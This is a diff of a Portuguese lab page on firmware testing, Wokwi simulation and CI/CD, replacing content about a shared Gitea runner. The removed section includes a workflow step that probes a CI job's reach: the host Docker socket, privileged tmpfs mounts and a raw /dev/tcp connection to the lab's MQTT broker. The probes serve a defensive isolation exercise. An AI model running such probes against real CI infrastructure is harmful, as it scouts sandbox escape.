@@ -3,21 +3,20 @@ title: Laboratório 11
 sidebar_position: 14
 ---
 
-## Checklist — o CI/CD do firmware no runner do LAB IoT {/* #checklist */}
+## Checklist — testes, simulação e CI/CD do firmware {/* #checklist */}
 
-- [ ] Repositório do grupo também no Gitea do LAB IoT, com um `git push` enviando para os dois, e o `ci.yml` do Lab 10 rodando no runner do laboratório (T1)
-- [ ] `diagnostico.yml` rodado no runner do lab **e** no do GitHub, com a tabela "o que o job enxerga" no `README.md` (T2)
-- [ ] `.gitea/workflows/ci.yml`: o pipeline portado, verde no Gitea (T3)
-- [ ] Tempos de fila e de cada job medidos com `ci/duracoes.py`: cache frio, cache quente e a turma toda junta (T4)
-- [ ] Release `v1.1.0` no Gitea com o firmware, e o experimento do `permissions:` (403) registrado (T5)
-- [ ] `main` protegido no Gitea: um PR com teste vermelho bloqueado, a notificação no ntfy e o merge depois da correção (T6)
+- [ ] Lógica da câmara separada em `lib/camara_logica` (sem Arduino) e o firmware compilando em `esp32dev` e `ci` (T1)
+- [ ] `pio test -e native`: pelo menos 15 testes Unity da lógica, todos passando, com relatório JUnit (T2)
+- [ ] `wokwi-cli`: `lint` do diagrama limpo e os testes Unity rodando no ESP32 simulado (T3)
+- [ ] Cenário de integração no `wokwi-cli` (modos pot e auto) e PWM medido no VCD do analisador lógico (T4)
+- [ ] Workflow do GitHub Actions com testes, firmware e simulação, badge no `README.md` (T5)
+- [ ] Notificações no ntfy (sucesso, falha e release) e release com o `firmware.bin` ao criar a tag `v1.0.0` (T6)
 - [ ] Previsões P1–P4 respondidas no `README.md`
 - [ ] Nenhum `push --force`; cada tarefa num commit `Tn:`
 
 :::info[Pontuação]
-**T1…T6 = 100 pts** (esta aula não tem desafios): T1 10 · T2 15 · T3 20 · T4 15 · T5 20 ·
-T6 20. O autograder normaliza para 0–10. Vale o commit `Tn:` mais recente de cada tarefa **no
-GitHub**.
+**T1…T6 = 100 pts** (esta aula não tem desafios): T1 10 · T2 20 · T3 15 · T4 20 · T5 15 ·
+T6 20. O autograder normaliza para 0–10. Vale o commit `Tn:` mais recente de cada tarefa.
 :::
 
 <LabSetup />
@@ -28,630 +27,1139 @@ GitHub**.
 
 ---
 
-No Lab 10, cada `push` acordava uma máquina virtual **do GitHub**, na nuvem, que testava,
-compilava, simulava e publicava o firmware. Funciona, mas tem custo e limites. Os minutos de
-um repositório privado são contados. A máquina não enxerga nada do laboratório. E o código, os
-tokens e o firmware passam por um serviço de terceiros.
+Até o Lab 09, um firmware "funcionava" quando **alguém** o rodava no Wokwi, girava o
+potenciômetro, mexia no slider do DHT22 e conferia o serial. Cada mudança no código pedia o
+mesmo ritual, e ninguém garantia que uma correção hoje não quebrasse o modo `auto` de ontem.
 
-Nesta aula, o **mesmo pipeline** roda no **LAB IoT**, num servidor da turma:
+Nesta aula, o firmware da câmara do Lab 07 passa a ser **verificado por máquina**, a cada
+`push`:
 
-1. o Gitea do LAB IoT tem o **Gitea Actions**, que lê workflows no mesmo formato do GitHub
-   Actions;
-2. quem executa os jobs é o **runner do laboratório**, um `gitea-runner` num container, com o
-   seu próprio Docker (Docker-in-Docker): cada job ganha um container novo e descartável;
-3. os secrets do ntfy e do Wokwi já estão na **organização** do grupo no Gitea, e a
-   notificação chega pelo ntfy do LAB IoT;
-4. o `main` do Gitea fica **protegido**: código com teste vermelho não entra.
+1. a **lógica** (setpoint, banda morta, PWM, histerese, comandos, JSON) sai do `main.cpp` para
+   uma biblioteca **sem Arduino** e ganha **testes unitários** que rodam no PC em 1 s
+   (`pio test`);
+2. o **Wokwi** vira uma bancada automática: o `wokwi-cli` roda o firmware sem interface,
+   mexe nos componentes por um **cenário** YAML e grava o **analisador lógico** em arquivo;
+3. o **GitHub Actions** junta tudo num **pipeline** e, numa tag `v*`, publica o
+   `firmware.bin` como **release**;
+4. o **ntfy** avisa no celular quando o pipeline fica verde, vermelho ou publica uma versão.
 
 ```mermaid
 flowchart LR
-  PC["PC do grupo<br/>git push"] --> GH["GitHub<br/>.github/workflows/"]
-  PC --> GT["Gitea do LAB IoT<br/>.gitea/workflows/"]
-  GH --> RH["runner do GitHub<br/>VM na nuvem"]
-  GT -- "tarefas" --> R["gitea-runner do lab<br/>Docker-in-Docker"]
-  R --> J1["container do job<br/>testes"]
-  R --> J2["container do job<br/>firmware"]
-  J1 -- "URL oficial" --> NG["nginx do LAB IoT<br/>/git/ · /ntfy/"]
-  J2 -- "URL oficial" --> NG
-  NG --> N["ntfy<br/>tópico grupo-ci"]
+  P[git push] --> T[testes<br/>pio test -e native<br/>wokwi-cli lint]
+  T --> F[firmware<br/>pio run esp32dev · ci<br/>testes p/ o alvo]
+  F --> S[simulacao<br/>wokwi-cli: Unity no ESP32<br/>cenário + VCD]
+  S --> R[publicar<br/>release v*]
+  T & F & S & R --> N[notificar<br/>ntfy]
+  N --> C[(celular / navegador)]
 ```
 
 ## Objetivos
 
-- Entender o papel do **runner**: quem pede trabalho, como o job escolhe a máquina
-  (`runs-on` e rótulos) e onde o job roda de fato.
-- Ver, por experimento, o **isolamento** de um job: rede, Docker, privilégios, secrets.
-- **Portar** um workflow do GitHub Actions para o Gitea Actions e saber o que muda.
-- Medir **fila** e **cache** num runner compartilhado pela turma.
-- Fazer **CD** pela API do Gitea com o token do job e o **mínimo** de permissão.
-- Usar o CI como **portão**: proteção de ramo com verificações obrigatórias.
+- Separar **decisão** de **periférico** para tornar o firmware testável sem hardware.
+- Escrever **testes unitários** com o Unity e rodá-los com o `pio test`, no PC e no ESP32.
+- Usar o **`wokwi-cli`**: `lint` do diagrama, `--expect-text`/`--fail-text`, **cenários**
+  (`set-control`, `write-serial`, `wait-serial`, `expect-pin`) e **VCD**.
+- Montar um **pipeline de CI/CD** no GitHub Actions: jobs, dependências, cache, artefatos,
+  secrets e release.
+- Notificar o resultado com o **ntfy**, sem expor tokens nem abrir brecha para injeção de
+  comandos.
 
 ## Material
 
-- O mesmo do Lab 10: VS Code + PlatformIO + extensão Wokwi, e o `git` no terminal.
-- O acesso do grupo ao **LAB IoT** (está na página de acesso do repositório do grupo no GitHub):
-  usuário `lab11-x`, a senha do grupo e a organização `lab11-grupo-x` no Gitea (`<base>/git/`).
-- O app **ntfy** no celular, com o servidor do LAB IoT e o login do grupo (como no Lab 10).
-- Rede do laboratório (ou o endereço público do LAB IoT, se o professor ligou o túnel).
+- VS Code + **PlatformIO** (o `pio` do terminal do PlatformIO) + extensão **Wokwi**.
+- **`wokwi-cli` 0.28.1** e um **token do Wokwi CI** ([wokwi.com/dashboard/ci](https://wokwi.com/dashboard/ci)). Cada
+  simulação gasta minutos da cota do plano (confira no painel): não deixe o CI rodando em loop.
+- Uma conta no **GitHub**, com o repositório do grupo.
+- **ntfy**: o app no celular (Android/iOS) ou o navegador. Use o servidor do LAB IoT, com o
+  tópico e o token do grupo, ou o `ntfy.sh` público, com um tópico difícil de adivinhar.
 
-:::info[GitHub Actions × Gitea Actions]
-| | GitHub Actions (Lab 10) | Gitea Actions (Lab 11) |
-| --- | --- | --- |
-| Pasta dos workflows | `.github/workflows/` | `.gitea/workflows/` (se não existir, `.github/workflows/`) |
-| Quem executa | VM do GitHub, uma por job | o runner do lab: um container por job |
-| `runs-on: ubuntu-latest` | imagem do GitHub | rótulo do runner → `runner-images:ubuntu-latest` |
-| `uses: actions/checkout@v4` | github.com | também github.com (`DEFAULT_ACTIONS_URL=github`) |
-| Secrets e variables | do repositório (que você criou) | da **organização** (o professor criou) e/ou do repositório |
-| Token do job | `GITHUB_TOKEN` | `GITEA_TOKEN` (o `GITHUB_TOKEN` também existe, é o mesmo) |
-| Release | `softprops/action-gh-release` | API do Gitea (`ci/release_gitea.py`) |
-| Vagas | muitas (cota de minutos) | `capacity` do runner (2 jobs ao mesmo tempo, para a turma) |
+:::info[O que roda onde]
+| Teste | Onde roda | Precisa de | Tempo |
+| --------------------------- | ----------------------- | --------------------------- | ------- |
+| `pio test -e native` | PC / runner do GitHub | só o `gcc` | ~1 s |
+| `wokwi-cli lint` | PC / runner | nada (nem token) | ~1 s |
+| Unity no ESP32 simulado | servidores do Wokwi | token do Wokwi | ~10 s |
+| Cenário de integração + VCD | servidores do Wokwi | token do Wokwi | ~30 s |
+
+Os testes no PC são a base: rápidos, sem cota e sem rede. A simulação pega o que o PC não vê:
+o compilador Xtensa, o LEDC, o ADC e a temporização do firmware inteiro.
 :::
 
 ## Clonar o repositório do grupo {/* #clonar */}
 
-<LabTeamMembers labName="lab11" />
+<LabTeamMembers labName="lab10" />
 
 ## Envie o link do repositório do seu grupo no Moodle: {/* #moodle-link */}
 
-<LabSubmit labName="lab11" />
+<LabSubmit labName="lab10" />
 
 <details>
 <summary><strong>Mapa de tarefas</strong> — 6 tarefas · 100 pts</summary>
 
-- [T1 — O repositório no Gitea e o runner do lab](#t1) · 10 pts
-- [T2 — O que o job enxerga](#t2) · 15 pts
-- [T3 — O pipeline portado para o Gitea](#t3) · 20 pts
-- [T4 — Fila e cache](#t4) · 15 pts
-- [T5 — Release no Gitea com o token do job](#t5) · 20 pts
-- [T6 — CI como portão (proteção do main) e ntfy](#t6) · 20 pts
+- [T1 — Lógica testável em lib/camara_logica](#t1) · 10 pts
+- [T2 — pio test no PC](#t2) · 20 pts
+- [T3 — wokwi-cli: lint e testes no ESP32 simulado](#t3) · 15 pts
+- [T4 — Cenário de integração e analisador lógico](#t4) · 20 pts
+- [T5 — Pipeline no GitHub Actions](#t5) · 15 pts
+- [T6 — ntfy e release (CD)](#t6) · 20 pts
 
 </details>
 
-O repositório nasce do `lab11-template`, com o **Lab 10 resolvido** (firmware, testes, cenário
-e o `.github/workflows/ci.yml` completo) e quatro arquivos novos em `ci/`:
-
----
+O repositório nasce do `lab10-template`, com o firmware **final do Lab 07** em
+`src/main.cpp`:
 
 <FileTree
   details={true}
   defaultOpen={false}
   title="Estrutura de Arquivos do Projeto"
-  root="lab11-grupo-X"
+  root="lab10-grupo-X"
   files={[
-    ".github/workflows/ci.yml r",
-    ".github/workflows/diagnostico.yml c",
-    ".gitea/workflows/diagnostico.yml c",
-    ".gitea/workflows/ci.yml c",
-    "ci/diagnostico.yml r",
-    "ci/release_gitea.py r",
-    "ci/duracoes.py r",
-    "ci/notificar.sh r",
-    "ci/cenario_integracao.yaml r",
+    "platformio.ini u",
+    "src/main.cpp u",
+    "lib/camara_logica/camara_logica.h r",
+    "lib/camara_logica/camara_logica.cpp c",
+    "test/test_logica/test_logica.cpp c",
+    "test/test_alvo/test_alvo.cpp c",
+    "diagram.json u",
+    "wokwi.toml r",
+    "ci/cenario_integracao.yaml c",
     "ci/verificar_pwm.py r",
     "ci/resumo_junit.py r",
-    "lib/camara_logica/camara_logica.cpp r",
-    "src/main.cpp r",
-    "test/test_logica/test_logica.cpp r",
-    "platformio.ini r",
-    "evidencias/t1-remotos.txt c",
-    "evidencias/t1-log-runner.txt c",
-    "evidencias/t1-gitea-actions.png c",
-    "evidencias/t2-diagnostico-gitea.txt c",
-    "evidencias/t2-diagnostico-github.txt c",
-    "evidencias/t3-gitea-actions.png c",
-    "evidencias/t4-duracoes.md c",
-    "evidencias/t5-403.txt c",
-    "evidencias/t5-release.png c",
-    "evidencias/t6-pr-bloqueado.png c",
+    "ci/notificar.sh r",
+    ".github/workflows/ci.yml c",
+    ".gitignore r",
+    "evidencias/t1-build.txt c",
+    "evidencias/t2-pio-test.txt c",
+    "evidencias/t3-lint.txt c",
+    "evidencias/t3-alvo-test_logica.txt c",
+    "evidencias/t3-alvo-test_alvo.txt c",
+    "evidencias/t4-cenario.txt c",
+    "evidencias/t4-pwm.txt c",
+    "evidencias/t5-actions.png c",
     "evidencias/t6-ntfy.png c",
+    "evidencias/t6-release.png c",
     "README.md u",
   ]}
 />
 
-## Parte 1 — O runner do laboratório {/* #parte-1 */}
+:::info[Tópicos do Lab 10]
+O firmware normal continua falando MQTT, agora em `elt85b/lab10/grupo-X/` (`dht`, `adc`,
+`pwm`, `status`), com os comandos em `elt85b/lab10/grupo-X/cmd/<nome>`: `modo`, `aquecedor`,
+`ventilador` e `intervalo`. O firmware de **CI** (`env:ci`) não usa rede: recebe os mesmos
+comandos pela **serial**, uma linha `<nome> <valor>` (`modo auto`, `aq 50`, `intervalo 2`).
+:::
 
-### 1.1 Quem faz o trabalho
+---
 
-O Gitea **não executa** nada. Ele guarda o código, lê o workflow a cada `push` e cria uma
-**fila de jobs**. Quem executa é o **runner**, um programa que fica perguntando ao Gitea "tem
-trabalho para mim?" (a cada 2 s). Ao pegar um job, o runner:
+## Parte 1 — Lógica testável {/* #parte-1 */}
 
-1. recebe o workflow do job, o contexto (`github.*`), os secrets e as variables;
-2. cria um **container** com a imagem do rótulo (`ubuntu-latest` →
-   `docker.gitea.com/runner-images:ubuntu-latest`);
-3. roda os steps dentro dele, manda o log ao Gitea em tempo real e, no fim, o resultado;
-4. **apaga** o container. O job seguinte começa limpo.
+### 1.1 Decisão × periférico
 
-O runner do LAB IoT é **um** para a turma toda, com `capacity: 2`: dois jobs ao mesmo tempo.
-Ele foi registrado no Gitea com um token que só o professor tem e roda num container com o
-**seu próprio Docker** (Docker-in-Docker). Os containers dos jobs nascem nesse Docker interno,
-e não no Docker do servidor, onde estão o Gitea, o Mosquitto e os Node-RED.
+No `main.cpp` do Lab 07, a regra da histerese estava misturada com `analogRead`, `ledcWrite` e
+`mqtt.publish`. Para testar a regra, era preciso um ESP32, um DHT22 e um broker. A saída é
+separar:
 
-```yaml title="runner/config.yaml (gerado pelo gen_iot_scada_portal.py, trecho)"
-runner:
-  capacity: 2 # jobs ao mesmo tempo (todos os grupos)
-  timeout: 1h # um job que passa disso é cancelado
-  labels: # runs-on: ubuntu-latest  ->  esta imagem
-    - "ubuntu-latest:docker://docker.gitea.com/runner-images:ubuntu-latest"
-cache:
-  enabled: true # actions/cache (ex.: ~/.platformio) sem sair do lab
-container:
-  privileged: false # os jobs NÃO são privilegiados (o runner é)
-  options: "--memory=3g --cpus=2"
-  valid_volumes: [] # nenhum job monta pasta do servidor
-```
+- **lógica**: funções puras, que recebem números e devolvem números ou texto. Não sabem o que é
+  um pino. Ficam em `lib/camara_logica` e compilam em qualquer computador;
+- **periférico**: lê o ADC e o DHT22, chama a lógica e escreve no LEDC e no MQTT. Fica no
+  `main.cpp` e só existe no ESP32.
 
-O rótulo tem duas partes. O **nome** (`ubuntu-latest`) é o que o Gitea compara com o `runs-on:`
-do job. O resto (`docker://...`) só o runner usa: é a imagem do container. Em
-`<base>/git/-/admin/actions/runners`, o professor vê o runner, o estado (**Idle** ou
-**Active**) e os rótulos.
-
-### 1.2 O repositório no Gitea {/* #t1 */}
-
-1. Entre no Gitea (`<base>/git/`) com o usuário do grupo. Na organização `lab11-grupo-x`:
-   **+ → Novo repositório**, nome `camara-ci`, **privado**, **sem** README, `.gitignore` nem
-   licença (o repositório precisa nascer vazio para receber o seu `push`).
-2. Crie um **token de acesso** para o `git` do PC, em vez de usar a senha: avatar →
-   **Configurações → Aplicações → Gerar token**, permissão **repository: leitura e escrita**.
-   Sem túnel, o LAB IoT usa HTTP: senha e token passam **sem criptografia** pela rede do
-   laboratório. Um token pode ser revogado sem trocar a senha do grupo (que vale para
-   Node-RED, FUXA, ntfy...).
-3. No clone do repositório do GitHub, acrescente o Gitea como um segundo remoto, `lab`, e
-   envie:
-
-   ```bash
-   git remote add lab http://<IP do LAB IoT>/git/lab11-grupo-x/camara-ci.git
-   git push lab main          # usuário lab11-x; senha = o token do passo 2
-   ```
-
-4. Para um `git push` mandar para **os dois**, dê ao `origin` duas URLs de envio. Ao
-   acrescentar a primeira URL de push, o `git` deixa de usar a URL normal para enviar, por isso
-   a do GitHub entra de novo:
-
-<GroupCommands
-  commands={[
-    {
-      title: "1. Configurar múltiplos remotos no Git",
-      codeTitle: "Terminal",
-      language: "bash",
-      command: `git remote set-url --add --push origin https://github.com/<org>/lab11-grupo-{group}.git
-git remote set-url --add --push origin http://<IP do LAB IoT>/git/lab11-grupo-{group}/camara-ci.git
-git remote -v`,
-    },
-    {
-      title: "2. Saída Esperada",
-      codeTitle: "Saída esperada",
-      language: "text",
-      command: `lab     http://192.168.0.10/git/lab11-grupo-{group}/camara-ci.git (fetch)
-lab     http://192.168.0.10/git/lab11-grupo-{group}/camara-ci.git (push)
-origin  https://github.com/<org>/lab11-grupo-{group}.git (fetch)
-origin  https://github.com/<org>/lab11-grupo-{group}.git (push)
-origin  http://192.168.0.10/git/lab11-grupo-{group}/camara-ci.git (push)`,
-    },
-  ]}
-/>
-
-### 1.3 O workflow do Lab 10 no runner do lab
-
-Ainda não existe `.gitea/workflows/`. Então o Gitea usa o `.github/workflows/ci.yml`, o mesmo
-do Lab 10. Abra **Actions** no repositório do Gitea: o `push` do passo 3 já criou uma
-execução. Clique no job **Testes da lógica** e acompanhe.
-
-- O job ficou um tempo em **Esperando**? É a fila: outros grupos estão usando as 2 vagas.
-- No começo do log, o runner se apresenta (`lab11-runner ... received task ...`) e mostra a
-  imagem do container. Copie as primeiras linhas do log para `evidencias/t1-log-runner.txt`.
-- Os secrets `NTFY_TOPIC`, `NTFY_TOKEN` e `WOKWI_CLI_TOKEN` e a variable `NTFY_URL` **não**
-  foram criados por você: vêm da **organização**, e só o dono dela (o professor) vê a lista.
-  O job recebe os valores, o grupo não. A notificação vai para o tópico `lab11-x-ci`: assine-o
-  no app ntfy.
-
-Quando a execução terminar, confira a notificação no celular. O botão diz **"Abrir no
-GitHub"** e o link tem uma barra a mais (`/git//lab11-grupo-x/...`). Anote: a T3 corrige.
+O **contrato** já está no repositório. Você escreve o `.cpp`:
 
 <FileTree
-  root="lab11-grupo-X"
-  files={[
-    "evidencias/t1-remotos.txt c",
-    "evidencias/t1-log-runner.txt c",
-    "evidencias/t1-gitea-actions.png c",
-    "README.md u",
-  ]}
+  root="lab10-grupo-X"
+  files={["lib/camara_logica/camara_logica.h r"]}
 />
 
-Salve `git remote -v` em `evidencias/t1-remotos.txt` e uma captura da execução no Gitea em
-`evidencias/t1-gitea-actions.png`. No `README.md`, preencha as URLs dos dois remotos.
+```cpp title="lib/camara_logica/camara_logica.h (trecho)"
+namespace camara {
+constexpr float SP_MIN = 20.0f, SP_MAX = 55.0f;   // °C
+constexpr int ADC_MAX = 4095;                      // 12 bits
+constexpr float HISTERESE = 0.5f;                  // ±0,5 °C
+enum Modo { MODO_POT = 0, MODO_REMOTO = 1, MODO_AUTO = 2 };
+
+float adcParaSetpoint(int raw);                    // 20..55 °C em passos de 0,5 (satura)
+bool mudouAlemDaBanda(int raw, int ultimoAceito, int banda);
+uint32_t dutyDe(float pct);                        // 0..100 % -> 0..255 (satura)
+
+struct Saida { float aq; float ve; const char *estado; };
+Saida decidir(Modo modo, int adcRaw, float t, float sp, float aqRemoto, float veRemoto,
+              bool &aquecendo);                    // 'aquecendo' = memória da histerese
+int interpretarModo(const char *txt);              // "pot"|"remoto"|"auto" -> 0..2; senão -1
+bool interpretarPercentual(const char *txt, float &pct);   // "0".."100"
+int formatarPwm(char *buf, size_t tam, Modo modo, const Saida &s, float sp, float t);
+}
+```
+
+Leve para `camara_logica.cpp` o que o Lab 07 já fazia, **sem** `#include <Arduino.h>`: use
+`<math.h>` (`roundf`, `lroundf`, `isnan`), `<stdio.h>` (`snprintf`), `<stdlib.h>` (`strtof`) e
+`<ctype.h>` (`tolower`). `decidir()` é o antigo `controlar()` sem os `ledcWrite`.
+
+### 1.2 O `main.cpp` passa a delegar
+
+```cpp title="src/main.cpp (trechos)"
+#include "camara_logica.h"
+using namespace camara;
+
+void lerAdc() {
+  // ... média de 16 leituras, como no Lab 07 ...
+  setpoint = adcParaSetpoint(adcRaw);
+}
+
+void controlar() {
+  Saida s = decidir(modo, adcRaw, ultimaT, setpoint, aqRemoto, veRemoto, aquecendo);
+  if (s.aq == atual.aq && s.ve == atual.ve && strcmp(s.estado, atual.estado) == 0) return;
+  atual = s;
+  pwmEscrever(AQ_PIN, AQ_CANAL, dutyDe(atual.aq));
+  pwmEscrever(VE_PIN, VE_CANAL, dutyDe(atual.ve));
+  publicarPwm();                         // formatarPwm(...) + publicar + Serial "[PWM] ..."
+  telaSuja = true;
+}
+```
+
+### 1.3 Firmware de CI: sem rede, comandos pela serial
+
+Um teste automático não pode depender do Wi-Fi do Wokwi nem do `broker.hivemq.com`: se o
+broker cair, o CI fica vermelho sem o código ter mudado. Com `-D SEM_REDE`, o firmware pula o
+Wi-Fi e o MQTT e lê os comandos pela serial:
+
+```cpp title="src/main.cpp (trechos)"
+#ifndef SEM_REDE
+#include <WiFi.h>
+#include <PubSubClient.h>
+#endif
+
+// um só lugar para os comandos: chamado pelo callback do MQTT E pela serial
+void executarComando(const char *nome, const char *valor) {
+  if (strcmp(nome, "modo") == 0) {
+    int novo = interpretarModo(valor);
+    if (novo < 0) { Serial.println("[CMD] modo invalido (use pot, remoto ou auto)"); return; }
+    modo = (Modo)novo; aquecendo = false; controlar();
+  } else if (strcmp(nome, "aquecedor") == 0 || strcmp(nome, "aq") == 0 /* ... */) {
+    // interpretarPercentual(valor, v) ...
+  } // ... "intervalo"
+}
+
+void lerSerial() {                       // junta caracteres até '\r\n' e separa "<nome> <valor>"
+  // ... strchr(linha, ' ') -> executarComando(linha, esp + 1)
+}
+
+void setup() {
+  // ... ADC, LEDC, DHT22, OLED como no Lab 07 ...
+#ifndef SEM_REDE
+  conectarWiFi(); mqtt.setServer(MQTT_HOST, MQTT_PORTA); /* ... */ conectarMQTT();
+#endif
+  Serial.println("[BOOT] pronto");      // o cenário do wokwi-cli espera por esta linha
+}
+```
+
+E o `platformio.ini` ganha três ambientes:
+
+<FileTree root="lab10-grupo-X" files={["platformio.ini u"]} />
+
+```ini title="platformio.ini"
+[platformio]
+default_envs = esp32dev
+
+[env]
+test_framework = unity
+
+[esp32]
+platform = espressif32@6.9.0             ; versão fixa: o CI precisa ser reprodutível
+board = esp32dev
+framework = arduino
+monitor_speed = 115200
+lib_deps =
+    adafruit/DHT sensor library@1.4.6
+    adafruit/Adafruit Unified Sensor@1.1.14
+    knolleary/PubSubClient@2.8
+    adafruit/Adafruit SSD1306@2.5.13
+    adafruit/Adafruit GFX Library@1.11.11
+
+[env:esp32dev]
+extends = esp32
+
+[env:ci]
+extends = esp32
+build_flags = -D SEM_REDE                ; não conecta ao Wi-Fi nem ao broker
+test_ignore = *                          ; este ambiente é só para o cenário do wokwi-cli
+
+[env:native]
+platform = native
+build_flags = -std=gnu++17
+test_ignore = test_alvo                  ; testes que precisam de periférico do ESP32
+lib_compat_mode = off
+```
+
+:::warning[Versões fixas]
+Num pipeline, `^1.4.6` ("qualquer 1.x a partir de 1.4.6") faz o **mesmo commit** compilar com
+bibliotecas diferentes em dias diferentes. Fixe a plataforma e as bibliotecas, e atualize de
+propósito, num commit próprio.
+:::
+
+```powershell title="Terminal do PlatformIO"
+pio run -e esp32dev -e ci | Out-File -Encoding utf8 evidencias/t1-build.txt
+```
+
+```text title="evidencias/t1-build.txt (final)"
+Environment    Status    Duration
+-------------  --------  ------------
+esp32dev       SUCCESS   00:00:41.120
+ci             SUCCESS   00:00:23.870
+```
+
+O firmware de CI fica bem menor (sem a pilha Wi-Fi e o MQTT), e por isso também simula mais
+rápido. Compare o `RAM:`/`Flash:` dos dois no log.
+
+<FileTree
+  root="lab10-grupo-X"
+  files={[
+    "lib/camara_logica/camara_logica.cpp c",
+    "src/main.cpp u",
+    "platformio.ini u",
+    "evidencias/t1-build.txt c",
+  ]}
+/>
 
 <CommitPoint
   id="t1"
-  task="Repositorio no Gitea e o runner do lab"
+  task="Logica testavel em lib/camara_logica"
   pontos={10}
-  files="evidencias/t1-remotos.txt evidencias/t1-log-runner.txt evidencias/t1-gitea-actions.png README.md"
+  files="lib/camara_logica/camara_logica.cpp src/main.cpp platformio.ini evidencias/t1-build.txt"
 />
 
 ---
 
-## Parte 2 — O que o job enxerga {/* #parte-2 */} {/* #t2 */}
+## Parte 2 — `pio test` no PC {/* #parte-2 */}
 
-Um runner compartilhado executa código de **todos** os grupos no servidor do laboratório. A
-pergunta de segurança é: o que esse código alcança? Em vez de confiar na descrição, meça. O
-`ci/diagnostico.yml` imprime quem o job é e testa, um a um, o que ele alcança:
+### 2.1 Unity em 30 segundos
 
-```yaml title="ci/diagnostico.yml (passo central)"
-- name: O que o job alcança
-  env:
-    NTFY_URL: ${{ vars.NTFY_URL }}
-  run: |
-    teste() { if bash -c "$2" >/dev/null 2>&1; then echo "✅ $1"; else echo "❌ $1"; fi; }
-    host="${NTFY_URL#*://}"; host="${host%%/*}"; host="${host%%:*}"
-    teste "nome 'gitea' (rede interna do lab)"      "getent hosts gitea"
-    teste "nome 'mosquitto' (rede interna do lab)"  "getent hosts mosquitto"
-    teste "Docker do servidor (/var/run/docker.sock)" "test -S /var/run/docker.sock"
-    teste "container privilegiado (mount tmpfs)"   "mount -t tmpfs none /mnt"
-    teste "Gitea pela URL oficial"                 "curl -fsS -m 5 ${GITHUB_SERVER_URL%/}/api/healthz"
-    teste "ntfy pela URL oficial"                  "curl -fsS -m 5 ${NTFY_URL%/}/v1/health"
-    teste "broker MQTT em ${host}:1883"            "timeout 3 bash -c '</dev/tcp/${host}/1883'"
-    teste "internet (github.com)"                  "curl -fsS -m 5 -o /dev/null https://github.com"
+O **Unity** é um framework de testes em C. Um teste é uma função `void` com asserções;
+`RUN_TEST` a executa e conta; `UNITY_END()` devolve o número de falhas.
+
+| Asserção                                    | Passa quando                      |
+| ------------------------------------------- | --------------------------------- |
+| `TEST_ASSERT_EQUAL_FLOAT(esperado, obtido)` | iguais (com tolerância de float)  |
+| `TEST_ASSERT_EQUAL_UINT32` / `_INT`         | inteiros iguais                   |
+| `TEST_ASSERT_EQUAL_STRING`                  | strings iguais                    |
+| `TEST_ASSERT_TRUE` / `_FALSE`               | condição verdadeira / falsa       |
+| `TEST_ASSERT_INT_WITHIN(delta, esp, obt)`   | \|esp − obt\| ≤ delta             |
+| `..._MESSAGE(..., "texto")`                 | idem, com mensagem extra na falha |
+
+O `pio test` procura pastas `test/test_*`, compila **cada uma** como um programa separado,
+junto com as bibliotecas de `lib/`, e lê o resultado. No `env:native`, o "programa" roda no
+seu PC.
+
+### 2.2 Os testes
+
+<FileTree root="lab10-grupo-X" files={["test/test_logica/test_logica.cpp c"]} />
+
+```cpp title="test/test_logica/test_logica.cpp (estrutura e alguns testes)"
+#include <math.h>
+#include <string.h>
+#include <unity.h>
+#include "camara_logica.h"
+using namespace camara;
+
+void setUp() {}
+void tearDown() {}
+
+void test_setpoint_extremos_e_meio() {
+    TEST_ASSERT_EQUAL_FLOAT(20.0f, adcParaSetpoint(0));
+    TEST_ASSERT_EQUAL_FLOAT(55.0f, adcParaSetpoint(4095));
+    TEST_ASSERT_EQUAL_FLOAT(37.5f, adcParaSetpoint(2048));
+}
+
+void test_setpoint_passos_de_meio_grau_e_monotonico() {
+    float anterior = adcParaSetpoint(0);
+    for (int raw = 0; raw <= 4095; raw++) {
+        float sp = adcParaSetpoint(raw);
+        TEST_ASSERT_EQUAL_FLOAT_MESSAGE(roundf(sp * 2) / 2, sp, "setpoint fora do passo de 0,5");
+        TEST_ASSERT_TRUE_MESSAGE(sp >= anterior, "setpoint diminuiu com o ADC subindo");
+        anterior = sp;
+    }
+}
+
+void test_auto_sequencia_do_lab07() {
+    // SP 37,5 °C; temperaturas do experimento da T6 do Lab 07 (+ 37,2 °C)
+    struct { float t; float aq; float ve; const char *estado; } passos[] = {
+        {24.5f, 100, 0, "AQUECENDO"},
+        {37.4f, 100, 0, "AQUECENDO"},    // dentro da histerese: continua aquecendo
+        {38.2f, 0, 0, "ESTAVEL"},
+        {41.0f, 0, 63, "RESFRIANDO"},    // (41 - 38,5) x 25 = 62,5 -> 63 %
+        {37.8f, 0, 0, "ESTAVEL"},        // acima de SP - 0,5: não religa
+        {37.2f, 0, 0, "ESTAVEL"},        // abaixo do SP, mas dentro da histerese (sem ela, religaria)
+        {36.8f, 100, 0, "AQUECENDO"},
+    };
+    bool aquecendo = false;
+    for (auto &p : passos) {
+        Saida s = decidir(MODO_AUTO, 0, p.t, 37.5f, 0, 0, aquecendo);
+        TEST_ASSERT_EQUAL_FLOAT(p.aq, s.aq);
+        TEST_ASSERT_EQUAL_FLOAT(p.ve, s.ve);
+        TEST_ASSERT_EQUAL_STRING(p.estado, s.estado);
+    }
+}
+
+void test_json_pwm() {
+    char buf[200];
+    Saida s{100, 0, "AQUECENDO"};
+    formatarPwm(buf, sizeof(buf), MODO_AUTO, s, 37.5f, 24.5f);
+    TEST_ASSERT_EQUAL_STRING(
+        "{\"modo\":\"auto\",\"estado\":\"AQUECENDO\",\"aq\":100,\"ve\":0,"
+        "\"aq_duty\":255,\"ve_duty\":0,\"sp\":37.5,\"t\":24.5}",
+        buf);
+}
+
+// ... os demais testes ...
+
+int rodarTestes() {
+    UNITY_BEGIN();
+    RUN_TEST(test_setpoint_extremos_e_meio);
+    RUN_TEST(test_setpoint_passos_de_meio_grau_e_monotonico);
+    RUN_TEST(test_auto_sequencia_do_lab07);
+    RUN_TEST(test_json_pwm);
+    // ...
+    return UNITY_END();
+}
+
+#ifdef ARDUINO                           // o mesmo arquivo roda no ESP32 (T3)
+#include <Arduino.h>
+void setup() { delay(1000); rodarTestes(); }
+void loop() {}
+#else
+int main() { return rodarTestes(); }
+#endif
 ```
 
-O último passo mostra o que acontece com um secret no log: o valor inteiro vira `***`, mas o
-tamanho e um pedaço do começo, não.
+**Requisito:** pelo menos **15 testes**, cobrindo:
 
-:::tip[Preveja antes de rodar]
-**P1:** o diagnóstico vai para `.gitea/workflows/diagnostico.yml` (e uma cópia para
